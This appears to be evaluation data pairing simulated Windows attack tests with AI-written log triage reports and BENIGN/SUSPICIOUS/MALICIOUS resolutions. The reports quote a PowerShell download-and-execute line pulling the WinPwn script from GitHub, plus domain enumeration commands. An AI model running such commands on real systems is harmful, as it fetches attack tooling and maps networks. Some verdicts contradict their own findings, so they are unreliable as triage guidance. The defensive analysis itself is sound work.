3. **EdgeUpdate Activities**:
   - A sequence of process creation events involves `MicrosoftEdgeUpdate.exe` and components thereof. These appear standard for a Microsoft Edge update operation and relate to process execution under `NT AUTHORITY\SYSTEM`, likely representing typical update behavior.
   - The logs do not display any anomalies in file paths or hash discrepancies that would usually signal tampered or malicious executables.

4. **Security Logs**:
   - The Security and Kernel-General logs show some events around the time synchronization, which are consistent with normal system activity and align with typical administrative operations.
   - No anomalies like unexpected user logins or privilege escalations were recorded here.

5. **Application and System Logs**:
   - Stopping of services related to `edgeupdate` correlates with update processes and seems benign.
   - The logs show standard system activity without any remarkable anomalies.

**Conclusion**:
Based on the evidence from the logs provided, there are no clear indicators of a compromise or malicious activity. The activities noted, such as process executions with tools like `whoami`, while potentially useful for reconnaissance, do not directly indicate malicious intent without further context connecting them to a threat actor or unauthorized access.

**Resolution**: **SUSPICIOUS**

While current activities might appear benign, the observed pattern of system information gathering could warrant a deeper investigation to rule out any misuse or unauthorized internal scanning. Recommend further monitoring, especially for any unauthorized access attempts or deviations from planned systems activity, and ensure robust logging to capture future anomalies."

    - **Observation**: The execution of `DismHost.exe` from a temporary directory could be suspicious, as legitimate instances typically run from `C:\Windows\System32\DismHost.exe`. This could be a sign of an attacker using a known process name from an unusual directory to disguise their activity.

2. **PowerShell Execution**
    - **Command**: `powershell.exe & {Get-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\GPO_Output.txt}`
    - **User**: `SERVER002\admin_test`
    - **Observation**: Use of PowerShell to dump GPO information to a temporary file could be indicative of reconnaissance activity. Such activity is often associated with credential theft or further lateral movement preparations.

3. **Frequent `wevtutil.exe` Executions**
    - **Path**: Occurs multiple times, consistently paired with `conhost.exe` executions.
    - **Observation**: `wevtutil.exe` is used for managing event logs, such as clearing or querying. Frequent execution, especially without clear operational purposes, may suggest an attempt to cover tracks by tampering with logs.

4. **Edge Update and Task Host Process**
    - **Path**: Legitimate locations and updates processes (`Microsoft Edge Update` and `taskhostw.exe`).
    - **Observation**: These processes appear normal, consistent with typical software update activity.

### PowerShell Log Observations:
- **Command Details**: Confirms execution of a PowerShell script to gather Group Policy Objects (GPOs) information.
- **Start and Stop**: PowerShell log indicates the execution lifecycle for the PowerShell command, providing context to the Sysmon logs.

### Assessment:
- **Suspicious Behavior**: The execution of `DismHost.exe` from a non-standard location and the scripting action of PowerShell to export GPO details indicate potentially suspicious behavior. The repetitive use of `wevtutil.exe` could imply efforts to manipulate event logs, a known tactic for evasion.

### Conclusion:
Based on the evidence and suspicious patterns observed:

- **Resolution**: **SUSPICIOUS**

### Recommendation:
- **Further Investigation**: 
  - Verify the origin and integrity of `DismHost.exe` in the temporary folder for potential malware.
  - Investigate the intentions and source of the PowerShell command extracting GPO information.
  - Review user `SERVER002\admin_test` for any unusual activities or escalations.
  - Check for corresponding Security log events, especially related to logon and task scheduling, that might support or refute the hypothesis of malicious activity.

Enumerate Windows Security Log via WevtUtil,"After a comprehensive examination of the event logs provided, please find the following analysis:

1. **Security Logs**
   - There are multiple security log events (ID: 4616) related to the adjustment of the system time, which are executed by `svchost.exe`, a legitimate Windows process. However, frequent and irregular changes in the system time can be an indicator of an attempt to manipulate timestamps to evade detection.
   - There are events (ID: 4634, ID: 4624) related to successful logon and logoff sessions using the `NTLM` authentication, originating from the `DESKTOP-3HL5B2P` workstation. While NTLM authentication is legitimate, the use of NTLM across the network might signal an outdated security protocol and should be monitored. 
   - The user `admin_test` is logged in and possesses a range of privileges, including `SeDebugPrivilege`, which allows it to debug and adjust system-level processes—a frequently targeted privilege for malicious actors.

2. **Sysmon Logs**
   - The `wevtutil.exe` and `conhost.exe` processes frequently appear in the logs. While `wevtutil` is a legitimate tool for managing Windows event logs, its use in conjunction with `cmd.exe` might indicate an effort to enumerate or export event logs, possibly for malicious purposes.
   - The `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` executables are observed. Running `whoami` is common during reconnaissance to gather information about user context, which can be neutral or suspicious depending on context. Use of `cmd.exe` to execute `wevtutil enum-logs` represents potential unauthorized log enumeration.
   - The execution of `MicrosoftEdgeUpdate.exe` and other activities related to Microsoft Edge updates appear to be routine update operations.

3. **System and Application Logs**
   - Logs describe routine system operations such as time adjustments and Edge browser updates. 
   - Events with provider `edgeupdate` indicate stopping of services related to browser updates, likely regular operational tasks.

**Assessment and Resolution:**

- The execution of typical administrative tools (`whoami`, `wevtutil`) and the privilege level of the `admin_test` user suggest potential suspicious activity but do not conclusively point towards a compromise.
- The frequent system time adjustments, coupled with administrative command executions, raise red flags that warrant closer monitoring and review.
- The authentication protocol and executed processes indicate planned or administrative activities that are benign in isolation but can be part of a broader, more suspicious pattern.

**Resolution:** **SUSPICIOUS**

Given the ambiguity and the potential for both benign and malicious interpretation, further investigation is needed. It is crucial to verify authentication activities and user intent, review `admin_test` activities in detail, and ensure robust login and logging policies are in place. Consider a deeper forensic analysis or monitoring, especially if connected to sensitive systems or past incidents of suspicious activities."
Enumerate domain computers within Active Directory using DirectorySearcher,"Upon examining the provided Windows event logs, I have made the following observations:

**Application log:**
- Windows Defender appears to be in a typical operational state, with no errors or warnings about potential threats, as indicated by the ""SECURITY_PRODUCT_STATE_ON"" status.

**Security log:**
- The repeated Event ID 5379 entries involve credential operations with a return code of ""3221226021,"" which typically indicates a status of ""access is denied."" While frequent access attempts may seem suspicious, they are all executed by the system (SubjectUserSid ""S-1-5-18"") and appear as system automated tasks rather than user-initiated actions.
- Event ID 4624 indicates successful logons, however, they are of Logon Type 5 (service), suggesting system-related operations rather than interactive logons by users.
- Event ID 4672 reflects privilege assignments typical of SYSTEM processes and provides no direct indication of privilege misuse.

**Windows PowerShell log:**
- Powershell command activities involve querying directory services, which could be considered suspicious depending on the context. The command reviewed appears to list computer objects using LDAP queries, possibly part of an inventory or audit process.
- The presence of a command string involving ""Write-Host"" could potentially be benign in a script used to list computers, provided it is known and sanctioned.

**Sysmon log:**
- Processes such as `powershell.exe` and `whoami.exe` spawned under ""SERVER002\\admin_test"" suggest typical usage, assuming ""admin_test"" is a legitimate administrative account.
- The use of `wevtutil.exe`, a utility to manage Windows events, can potentially be used in legitimate system administration to export or clear logs. Its misuse can also indicate log tampering attempts.
- Other process executions, predominantly by `SYSTEM` or `NT AUTHORITY`, pertain to system updates or other maintenance operations. No indications of non-standard or unexpected binaries are found in use beyond those expected for updates or telemetry, such as `DeviceCensus.exe`.

**Assessment and Conclusion:**
The event logs primarily indicate regular system and update activities, with a limited amount of interactions that may warrant further checking. Specifically, Powershell scripts used should be validated for legitimacy and purpose.

- **Resolution**: **SUSPICIOUS**
  - The PowerShell command execution and repeated credential operations need further investigation to confirm that they are part of legitimate administrative activities. It is recommended to verify the source and purpose of the PowerShell script and seek to confirm that `admin_test` actions align with authorized tasks. Additionally, verifying if any sensitive information may have been accessed through the credential operations and why access was denied might provide further insights."
Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope,"Based on the event logs provided from the Windows host, a detailed analysis is as follows:

1. **Overview and Correlation of Events:**
   - Most of the Sysmon events captured are related to process creations (`EventID: 1`) and process terminations (`EventID: 5`) involving standard Windows tools like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `powershell.exe`. These are legitimate Windows processes, often used in system administration tasks.
   - The administrator account `SERVER002\\admin_test` frequently executes commands. The logged actions are consistent with tasks that a systems administrator might perform.

2. **Specific Event Analysis:**
   - **wevtutil.exe and conhost.exe**: These processes are typically involved in reading and managing event logs and the console host, respectively. There is no clear indication of these being used maliciously or atypically in these logs.
   - **HOSTNAME.EXE and whoami.exe**: Both tools are used for retrieving the system's hostname and the current logged-in user information, respectively. These actions align with common administrative activities or scripts.
   - **PowerShell Command**: The execution of PowerShell with the command `Get-adcomputer -SearchScope subtree -filter ""name -like '*'"" -Properties *` is used to retrieve a list of Active Directory computer objects. This command reflects standard administrative activity aiming to list computer properties, although it should be checked to ensure it aligns with normal usage patterns and approval.

3. **Process Integrity Levels and Users:**
   - Processes are executed with a `High` integrity level by the `SERVER002\\admin_test` user. Given the context of these services, this is not inherently suspicious, but it does indicate administrative privileges were applied.

4. **Time and System Logs:**
   - There are time adjustments in the system logs, synchronized with `time.windows.com`, which is standard practice to ensure time accuracy across systems.
   - The `Security` log entries auditing time adjustment (`EventID: 4616`) show adjustments made by the `LOCAL SERVICE`, which correspond with legitimate time synchronization services.

5. **Analysis of Potential Anomalies or Malicious Activity:**
   - There are no clear indicators of privilege escalation, unusual command lines, or execution of foreign/malicious software that deviates from known legitimate applications.

**Conclusion:**
- **Resolution: BENIGN** - The activities recorded across the logs seem to reflect typical system administration tasks without explicit signs of malicious behavior or compromise. However, it's always prudent to validate these actions against expected administrative tasks on the host, ensuring all actions are accounted for as legitimate.

Enumerate all accounts (Domain),"Upon reviewing the provided Sysmon log entries from the Windows machine, here's the analysis:

1. **Usage of whoami.exe**: `whoami.exe` is executed multiple times by the user `SERVER002\\admin_test`. While this is a legitimate Windows command-line utility used to find out the currently logged-in user, frequent or unexpected uses can be indicative of investigation activity, which might be a precursor to an attack.

2. **Execution of PowerShell/Console-related processes**:
   - **`conhost.exe`**: This is a normal Windows utility used to host console windows. Its presence as a child process of both `whoami.exe` and other executable processes is typical and expected behavior.
   
3. **Net user and net group Commands**:
   - There are executions of `cmd.exe` with suspicious-looking parameters such as `net user /domain` and `net group /domain`. These commands are typically used to enumerate user accounts and groups within a Windows domain and could be indicative of an attacker's reconnaissance activity. Such actions can signify attempts to gather information regarding users and groups on the network.
   
4. **Usage of wevtutil.exe**: `wevtutil.exe` was observed in several log entries. This tool can be used to clear or export Windows event logs, indicating potential log-tampering activities which could be conducted by an attacker trying to cover their tracks.
   
5. **Microsoft Edge Update Activities**:
   - Multiple entries relate to Microsoft Edge Update processes, which is a standard update process managed by the system. These seem legitimate as they run with NT AUTHORITY\SYSTEM privileges and are typical for browser updates; thus, they do not show clear signs of compromise.
  
6. **Security Patches and Updates**:
   - The presence of updates and installers for Microsoft products such as Edge is typical for a system periodically fetching updates.
   
**Assessment**:

- The repeated execution of administrative commands such as `whoami`, `net user`, and `net group` for exploring user accounts and groups suggests suspicious activities, possibly pointing to unauthorized reconnaissance actions. These actions, especially when performed in quick succession with various connections or after hours, can often indicate that an attacker is exploring network configurations and privileges.

- The presence of `wevtutil.exe` suggests attempts to potentially tamper with or review system logs by users involved, possibly to evade detection.

**Resolution**: **SUSPICIOUS**

Given the outlined behavior and context, the activities noted in the logs are suspicious, suggesting unauthorized exploration or reconnaissance on the compromised host. Further investigation is required, focusing on:
- Verifying the legitimacy of the `admin_test` user account's activities.

- Implementing more detailed monitoring to catch any potentially malicious follow-up actions.

It's critical to validate whether the activities align with known administrative procedures or if they are unauthorized attempts by an external actor."
WinPwn - fruit,"**Investigation Summary:**

Upon analyzing the provided logs, some behaviors and events stand out as potentially suspicious or malicious:

### **Application Log:**
1. Events indicate that Windows Defender is ON, suggesting that the system's built-in security measure is active. This is standard behavior.

### **Windows PowerShell Log:**
1. **Suspicious PowerShell Activity:** 
   - The command executed involves downloading and running a script from a GitHub repository using PowerShell. The command `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')` is noteworthy as it uses Invoke-Expression (iex), a method often associated with executing scripts from untrusted sources. This behavior is potentially indicative of malicious activity as it might involve executing a PowerShell script that could harm the system.

### **Sysmon Log:**
1. **Execution of PowerShell Scripts:** 
   - Sysmon logs indicate processes associated with PowerShell execution. Given that this aligns with the suspicious PowerShell entries, it confirms a correlation of potentially unauthorized scripts being run.
2. **Usage of `wevtutil.exe` and `conhost.exe`:**
   - While `wevtutil.exe` and `conhost.exe` are legitimate Windows processes, their presence in quick succession alongside the suspicious PowerShell activity necessitates concern. These logs appear to be from routine system operations and may not be directly suspicious without further context.

### **Security Log:**
1. **Elevated Token and Privileges:**
   - Two logins from the user `admin_test` involve an elevated token and a list of high-level privileges such as `SeDebugPrivilege` and `SeImpersonatePrivilege`. Such privileges provide the ability to perform powerful operations on the system. This user's actions, especially in conjunction with the suspicious PowerShell activities, warrant close inspection.

Given the suspicious PowerShell script downloading from an external source and escalation of privileges, there is a reasonable basis to conclude that some level of compromise may have occurred.

### **Assessment and Resolution:**

**Resolution: MALICIOUS**

- The evidence suggests an execution of potentially harmful scripts through PowerShell, coupled with elevated privileges by the user `admin_test`. The behavior denotes a calculated attempt to compromise the system, possibly to exploit or establish persistence.
 
### **Guidance:**
1. **Immediate Actions:**
   - **Isolate the machine** from the network to prevent further potential harm or spread of malicious activity.
   - **Conduct a deeper forensic analysis** of the machine to identify any additional indicators of compromise.
   - **Review user accounts** and recent login history for unauthorized access.
   
2. **Remediation:**
   - Consider re-imaging the affected machine to ensure no hidden threats remain.
   - Update all systems and software to ensure the latest security patches are applied.
   
3. **Preventive Measures:**
   - Enforce least-privilege principles and monitor for abnormal activities.
   - Enhance logging and alerting mechanisms for early threat detection.

This analysis highlights a significant risk of system compromise through seemingly targeted actions at privilege escalation and remote script execution. Immediate intervention is necessary to contain and remedy the threat."
System Owner-User Discovery Using Command Prompt,"Upon review of the provided Windows event logs from ""Server002"", here's a detailed analysis of the key points and conclusions drawn:

Multiple credential read attempts resulted in zero credentials returned. These events involve operations with Microsoft and Windows Live accounts and could indicate failed attempts to access credentials or log on with a user token or certificate. However, these appear with the machine's account (e.g., SERVER002$), rather than an external user, suggesting a benign internal operation or a misconfiguration.

### Sysmon Log:
- Multiple instances of the `wevtutil.exe` and `conhost.exe` processes being executed are noted. These processes are common in routine operations or when accessing log data through the command line. The frequent execution around the same timeframe may warrant closer inspection to rule out misuse but appear to be conducted under the same admin account, `SERVER002\admin_test`.
- Execution of command-line operations using tools like `cmd.exe` with parameters involving environment variables (e.g., `set file=$env:temp\\user_info_%%random%%.tmp`) can sometimes indicate script or automation activity. The creation of user info files with `net users` and `query user` can be administrative actions to gather account data.
- Routine Windows processes such as `whoami.exe`, `hostname.exe`, and `net.exe` are executed. These could be legitimate administrative tasks or scripts for gathering system information.

### Application Log:
A log entry for the Security Center (Windows Defender) marked as ""SECURITY_PRODUCT_STATE_ON"" affirms that the antivirus protection was active, reinforcing that the system security features were operational.

### Conclusion:
The logs primarily demonstrate routine updating and administrative activities, though they do include several credential access attempts and executions of processes that might typically indicate administrative queries or maintenance scripts. There are no clear indicators of any malicious payloads, privilege escalation, or use of suspicious or non-standard tools.

The sequences of observed activities, paired with the context this is within a server environment, suggest that what has been logged is expected behavior for system updates, verification, and possibly routine administrative tasks.

### Resolution: BENIGN

Although some entries could be misconstrued as suspicious without context (such as multiple system utility executions and access denied messages), under these circumstances they don't indicate malicious intent. No further defensive actions are recommended unless operational context raises specific concerns."
List Open Egress Ports,"Based on the analysis of the provided Windows event logs, let's break down the findings:

### PowerShell Logs Analysis
The PowerShell logs show a script execution on the host `Server002`. The script is reading from `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\top-128.txt` and attempting to connect to a list of ports on a remote server `allports.exposed`. The results of these connections are being written to a file on the desktop named `open-ports.txt`.

**Indicators of Suspicion:**
- Usage of PowerShell for scripting and network connectivity is often associated with administrative tasks or potentially malicious activity.
- Access to `allports.exposed` suggests potential reconnaissance activity to scan open ports on a remote server.
- The script writing results on the user's desktop may indicate an attempt to catalog network exposure or vulnerabilities.

### Sysmon Logs Analysis
Sysmon logs show several executions related to PowerShell, ConHost, and other standard Windows executables:
- `powershell.exe` is being run with a script indicating network activity, consistent with the PowerShell log.
- Various instances of `conhost.exe` and `wevtutil.exe` are seen, which are typical for console applications but are spawned in a sequence that correlates with the execution of PowerShell scripts.
- We see `hostname.exe` and `whoami.exe`, which could be part of routine system checks or potentially used by scripts for gathering system information.

**Indicators of Suspicion:**
- High integrity levels associated with process executions by the user `SERVER002\admin_test`, indicating administrative privileges.
- The combination of PowerShell scripting, system information gathering commands (`HOSTNAME.EXE`, `whoami.exe`), and network port scanning indicates potential precursors to more serious malicious activity.

### Application, Security, and System Logs Analysis
- The application log shows an unrelated entry concerning the Software Protection Platform Service, not exhibiting any direct signs of suspicious activity.
- The security logs and system logs do not provide additional information that highlights specific malicious action.

### Assessment and Resolution
The behavior observed in the logs does not definitively confirm malicious activity; however, the use of a network scanning script through PowerShell and the observed patterns of system information gathering and administrative-level operations merit concern.

- **Resolution:** **SUSPICIOUS** - The activity noted in the logs is suspect, particularly the scripted network scanning operation. While this could be for legitimate administrative purposes, it fits patterns often associated with reconnaissance activities used in cyberattacks. Further investigation should be conducted to determine the legitimacy of the actions taken by `SERVER002\admin_test`, assess any unauthorized access or changes, and ensure no data was exfiltrated.

### Guidance on Proceeding
1. **Investigate the User Account:** Review the actions related to `SERVER002\admin_test`, including recent changes to administrative privileges and related access.
2. **Validate the Script Purpose:** Contact the responsible IT team or individual to confirm if the PowerShell script execution was authorized and part of routine operations.
3. **Review Network Traffic:** Analyze the network logs for any unusual outbound connections to `allports.exposed`.
4. **Conduct a Threat Hunting:** Check for any other indicators of compromise across the network and ensure endpoint security solutions are updated.
5. **Implement Monitoring:** Set alerts for similar scripting activities and system level changes in the future to react promptly to potential threats.

A more thorough investigation and contextual analysis of the situation might reveal more concrete evidence regarding the nature of the actions performed on the system."
ESXi - Darkside system information discovery,"Based on the provided logs, here's a detailed analysis:

1. **Suspicious Usage of PowerShell and Wevtutil**:
   - A process was executed using `powershell.exe` under the user `SERVER002\admin_test`. Powershell is a powerful scripting tool and its use might not be uncommon; however, it is often used in cyber-attacks to run scripts for reconnaissance or to download malicious payloads.
   - The execution of `wevtutil.exe`, which is a Windows Event Log management utility, could be suspicious if used to clear event logs as part of anti-forensic measures.

2. **Use of Plink.exe for SSH Access**:
   - The execution of `plink.exe` with an SSH command targeting a user ""root"" on a remote system using a plaintext password indicates a potentially unauthorized remote connection or data exfiltration attempt. This is highly suspicious as it suggests a potential lateral movement or data breach action.

3. **Other Process Executions**:
   - Most other processes such as `conhost.exe`, `cmd.exe`, `whoami.exe`, and `hostname.exe` running under `SERVER002\admin_test` seem to serve normal operations based on their contexts and parameters.
   - Legitimate processes like Microsoft Edge Update processes are detailed with consistent behaviors expected in system operations.

4. **Logon and Privilege Escalation Activity**:
   - Events showing logon activities (Event ID 4624) and special privileges assigned (Event ID 4672) are seen. These are routine for system processes, but combined with suspicious command executions might indicate privilege misuse.

**Assessment**:
- **Suspicious**:
   - The usage of `powershell.exe` and `wevtutil.exe` might represent an attempt to execute potentially harmful scripts and manage (possibly clear) logs.
   - The invocation of `plink.exe` with SSH commands using plaintext passwords is a significant indicator of a potential intrusion or unauthorized access attempt.

**Resolution**: As per the analysis, the resolution of this situation is **SUSPICIOUS**. The logs suggest behavior that does not appear typical and warrants further investigation to determine if these activities are authorized or if further compromises exist in the environment.

**Guidance to Proceed**:
- Conduct a thorough inquiry into the purpose and authorization of the `powershell.exe` and `wevtutil.exe` executions by `admin_test`.
- Investigate the connection attempt using `plink.exe` and verify if it was legitimate or if it requires containment and response.
- Review security policies around the use of these tools and script execution to prevent unauthorized access and potential attacks.
- Analyze user accounts and credentials for indications of unauthorized modifications or access."
PowerShell Network Sniffing,"Having reviewed the Windows event logs provided, here is a detailed analysis of the events and behaviors observed:

1. **Time Discrepancy and Time Changes:**
   - From the `System` log and the `Security` log, it is evident that the system experienced a time change event (EventID 4616). The time was reverted by a few seconds. This could indicate an attempt to manipulate log entries' timestamps which can sometimes be indicative of malicious activity. However, it's also possible that this could be a routine time sync operation with an NTP server.

2. **PowerShell Activity:**
   - There is a non-trivial PowerShell execution traced in both the Sysmon and Windows PowerShell logs:
     - The command executed creates a new network event session, captures packets, and stores the output in a temporary file (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\sniff.etl`). The capturing of network packets can indicate a reconnaissance attempt or data exfiltration process, suggesting suspicious behavior.

3. **User and Process Activity:**
   - Multiple legitimate processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `HOSTNAME.EXE`, and `WindowsPowerShell.exe` are executed by the user `SERVER002\\admin_test`. While usage of these tools can often be legitimate, in the context of the environment described and combined with PowerShell's network capturing activity, this merits further investigation.
   
4. **Privileged User and Elevated Activity:**
   - The security logs show that the user `admin_test` has used significant privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.). This, combined with the aforementioned activity, raises concerns about potential privilege escalation.

5. **Background Activity by SYSTEM and Network Service:**
   - The activities of `svchost.exe`, and `WmiPrvSE.exe` under `User` context `NT AUTHORITY\\SYSTEM` and `NT AUTHORITY\\NETWORK SERVICE` appear routine for Windows service processes managing network-related and service operations. No explicit malicious pattern is clear from these actions at this time.

### Assessment:
The main unusual behavior arises from the PowerShell-related network packet capturing, combined with the potential clock manipulation logged by the time service and user processes needing a detailed examination. These are strong indicators of potentially suspicious activity, though stopping short of confirming direct malicious intent without additional context or corroborative attack signatures.

### Resolution:
- **SUSPICIOUS** - The logs indicate actions that warrant deeper exploration:
  1. Investigate the purpose and intent of the PowerShell network packet capture.
  2. Verify any legitimate administrative activities conducted by `admin_test` coinciding with the event timestamps.
  3. Ensure there are no unauthorized time server syncs or intentional time changes aiming at log alteration.
  4. Conduct an endpoint scan or deploy a network monitoring tool to detect any ongoing unauthorized network activities.
  
These steps should help clarify the intent behind these entries and either confirm or dispel suspicions of a security risk."
Find and Display Internet Explorer Browser Version,"After reviewing the provided log entries, let's break down the findings:

1. **Repeated Use of ""wevtutil.exe"" and ""conhost.exe"":** 
   - The Sysmon logs show multiple executions of ""wevtutil.exe"" and ""conhost.exe."" The ""wevtutil.exe"" is used for managing event logs, and ""conhost.exe"" is a legitimate Windows process for command-line interfaces. While repeated execution of these processes could be normal, excessive or unexpected usage in a short time span could indicate log tampering or other malicious activity.

2. **Execution of ""HOSTNAME.EXE"" and ""whoami.exe"":**
   - These executables reflect benign activities under normal circumstances as ""hostname.exe"" displays the computer's hostname and ""whoami.exe"" shows the current user. Their occurrence in the logs appears to be part of routine maintenance or system checks.

3. **Execution of ""cmd.exe"" with registry query:**
   - The command executed via cmd.exe (`""cmd.exe"" /c reg query ""HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer"" /v svcVersion`) is querying the registry. This activity itself is not inherently malicious; it may reflect legitimate system administration tasks.

4. **Time Change Events:**
   - System and Security logs indicate time changes. Consistent timestamp changes within the system and security logs may be suspicious, often associated with attempts to manipulate time-based logs or events. However, the new and old times are very close, likely reflecting a time synchronization with an NTP server.

5. **Integrity Level and Process Execution Context:**
   - Processes are executed with a high integrity level, often indicating operations requiring elevated privileges. The user account ""SERVER002\\admin_test"" runs these commands, which should align with expected behavior for administrative users.

### Assessment:

Based on the logs:
- The use of tools like ""wevtutil"" and querying registry keys, given the context of the operations, could be a result of administrative scripts or routine checks.
- The activities such as launching hostname, whoami, and registry query using cmd.exe suggests normal administrative actions rather than inherently malicious intent.
- The time changes are brief, indicating likely NTP synchronization rather than tampering.

### Conclusion: **SUSPICIOUS**

While the activities detected in the logs could be benign in nature, they include the usage of system utilities that are often involved in malicious activities when seen outside of regular administrative tasks. Given the nature of excessive use of ""wevtutil"" and time change events, further investigation is warranted to confirm the legitimacy of these actions and ensure they align with regular administrative scripts or user behavior.

---

**Next Steps:**
- Confirm the actions in the logs against known administrative tasks or scripts.
- Review access patterns for the account ""SERVER002\\admin_test"" to verify these actions align with typical behavior.
- If suspicious activity cannot be corroborated as benign, consider a deeper forensic investigation to rule out potential compromise."
System Time with Windows time Command,"Upon analysis of the provided Windows event logs, I have identified several key points that indicate the need for further investigation:

1. **Privilege Escalation**
   - **Security Event ID 4672**: The event indicates special privileges were assigned to a new logon session using the account `admin_test`. Privileges listed include powerful ones like `SeTakeOwnershipPrivilege`, `SeDebugPrivilege`, and `SeLoadDriverPrivilege`. These privileges can be exploited for system compromise, making this event noteworthy.

2. **Unusual Process Execution**
   - **Security Event ID 4624**: Validates the logon of the `admin_test` account via NTLM from an unusual workstation (`DESKTOP-3HL5B2P`) with logon type 3, which generally indicates a network logon, potentially pointing to lateral movement.
   - **Sysmon Log - Process Execution Events**: Multiple processes (`wevtutil.exe` and `conhost.exe`) executed by the `admin_test` user. `wevtutil.exe` is commonly used for logging tasks and could suggest log tampering. Its execution in rapid succession raises a flag for potential batch scripting or automation meant to evade detection or alter logs.

3. **Time Manipulation**
   - **Security Event ID 4616**: Multiple events indicating changes in system time. This could be benign if related to time synchronization; however, frequent and near-simultaneous timestamp adjustments might suggest an attempt to disrupt system event chronology.

4. **Miscellaneous Observations**
   - **Sysmon and Application Logs**: Series of executions related to Microsoft Edge updates appear consistent with automated update processes, exhibiting expected behavior without distinct malicious indicators.

Based on these observations:

- The presence of unusual privilege assignment to an `admin_test` user and the series of `wevtutil.exe` executions signal potential areas of concern for further analysis.
- Frequent time changes in logs and impersonation of network services while executing commands raise suspicion.

**Assessment and Resolution**: The findings indicate the need for further exploration due to highlighted potentially malicious activities, especially surrounding the use of high-privilege account actions and unusual command-line tool executions.

- **Resolution**: **SUSPICIOUS**
  - **Next Steps**:
    - Review systems accessing from remote workstations, particularly `DESKTOP-3HL5B2P`.
    - Cross-reference events with network logs to identify unauthorized accesses.
    - Investigate any modifications or deletions in the log archives around the observed time adjustments, possibly pointing to log tampering.
    - Monitor the `admin_test` account for further unusual activities or unauthorized changes, including any adjustments to security settings or processes.

These steps aim to discern whether these activities are legitimate system operations or if they represent further progression in a potential compromise."
Network Share Discovery via dir command,"**Analysis of Provided Event Logs**

Upon review of the provided Sysmon logs, Windows Event Details, and Application logs, we can identify a few key activities to consider:

1. **Frequent Execution of System Commands and Utilities:**
   - There are multiple instances of `whoami.exe`, `cmd.exe`, and `wevtutil.exe` being executed. While `whoami.exe` and `wevtutil.exe` might be part of administrative tasks, the execution of `cmd.exe` with command-line arguments attempting to list directories on administrative shares (`\\127.0.0.1\c$`, `\\127.0.0.1\admin$`, `\\127.0.0.1\IPC$`) raises suspicion. Accessing administrative shares locally could indicate lateral movement or exploration for sensitive information.

2. **Edge Update Execution:**
   - There are several processes related to `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`, and `setup.exe` appearing frequently. Typically, Edge updates can occur silently in the background; however, their frequent execution across multiple paths and directories, coupled with some temporary paths, necessitates a closer look to ensure they are legitimate and not potentially unwanted installations or disguised malicious software.

3. **Process Execution Under NT AUTHORITY\SYSTEM:**
   - A significant portion of these processes, particularly the Edge Update-related ones, are executed under `NT AUTHORITY\SYSTEM`. While the updates may require elevated privileges, malicious software often uses similar execution patterns to gain more control over the system.

4. **Application Log Entry:**
   - The event log indicates the ""Service stopped"" by a provider named ""edgeupdate"". The nature and frequency of these events should be checked against known and legitimate update patterns for Microsoft Edge to rule out misuse.

5. **Network Service Execution:**
   - The Syslog contains an execution of `sppsvc.exe` under `NT AUTHORITY\NETWORK SERVICE`. The `Software Protection Platform Service` is legitimate, but we'd need to ensure it aligns with typical service behavior and timing.

**Assessment and Recommendations:**

- **SUSPICIOUS**: The activity observed in the logs warrants categorization as suspicious. Particularly, the command-line execution of directory commands on administrative shares, the numerous and repeated Edge Update executions from temporary and versioned directories, and the privilege level under which these activities are conducted (SYSTEM) demand caution.

- **Further Investigation Needed**: 
  - Verify whether Edge Update activities are consistent with official update releases from Microsoft.
  - Investigate the context and source of command-line executions accessing administrative shares.
  - Conduct checks for any known indicators of compromise related to privilege escalation exploits leveraging similar tools and patterns.
  - Review endpoint protection alerts or perform a more comprehensive threat-hunt across associated assets, particularly focusing on user `SERVER002\admin_test`.

**Next Steps:**
- Implement continuous monitoring for indicators of potentially unwanted programs or threats.
- If additional logs (Security or other network traffic logs) can be obtained, verify any unauthorized access or unusual patterns.
- Consider isolating the host if immediate examination reveals unauthorized alterations or presence of anomalies.

With the current evidence, ensure that procedures align with incident response policies, and the situation is handled discreetly yet thoroughly to mitigate any potential threats."
WinPwn - shareenumeration,"In analyzing the Windows event logs provided, there are significant indicators of suspicious activity that warrant further investigation. Below is the assessment based on the logs from various channels:

1. **System Log:**
   - The entries in the system log primarily indicate routine system activities such as time synchronization and Windows Update operations. These do not present any immediate indication of malicious activities.

2. **Application Log:**
   - The application log entries show standard operations related to the Windows Defender and Edge updates. There are no evident signs of anomalous behavior or security alerts in this section.

3. **Windows PowerShell Log:**
   - A significant suspicious activity is observed here. There are records of PowerShell executing a script downloaded from a GitHub repository (https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1). The use of PowerShell to download and execute scripts from the internet is a common method employed in malicious exploitation and command execution attacks. This specific script (WinPwn) is known in security contexts to be used for reconnaissance or exploitation purposes.

4. **Sysmon Log:**
   - The Sysmon log records processes associated with administrative or sensitive activities, like the execution of `wevtutil.exe` by a user (""SERVER002\\admin_test""), which could indicate attempts to clear event logs or tamper with them. Moreover, the frequent execution of the `EdgeUpdate` process might be part of the normal update routine, but when seen in conjunction with other potentially malicious indicators, it might require further scrutiny.

5. **Security Log:**
   - The security logs involve routine time-change events and have no apparent direct signs of malicious activities, yet these time changes can be relevant in a forensic context if paired with other logs, especially if time skew is used to obscure attack timelines.

**Assessment:**

Based on the analysis, the most concerning part of these logs is the use of PowerShell to download and possibly execute a script from an external source, which is a direct indicator of potentially malicious intentions. While other entries can be considered routine or expected system behavior, the PowerShell activity is abnormal and indicative of malicious behavior, especially in a secure enterprise environment. This requires immediate attention to understand the implications fully.

**Resolution:** MALICIOUS

**Guidance:**
1. **Immediate Response:**
   - Isolate the affected machine (Server002) from the network to prevent further potential spread of any malicious activity.
   - Conduct further forensic analysis to determine if the script executed successfully and what actions it may have taken.

2. **Review and Validate:**
   - Validate the integrity of other systems in the network to ensure they are not compromised.
